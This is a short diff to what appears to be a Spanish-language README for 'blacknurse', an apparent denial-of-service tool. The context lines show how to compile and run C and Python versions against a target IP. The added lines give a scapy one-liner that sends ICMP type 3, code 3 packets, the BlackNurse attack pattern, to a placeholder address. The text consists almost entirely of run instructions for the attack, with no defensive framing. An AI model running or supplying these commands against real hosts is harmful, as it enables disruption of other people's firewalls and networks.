@@ -8,4 +8,6 @@ gcc blacknurse.c -o blacknurse
 Ejecutar en Python:
 python blacknurse.py IP
 
+Ejecutar con scapy: 
+send(IP(dst="1.2.3.4")/ICMP(code=3,type=3))
 
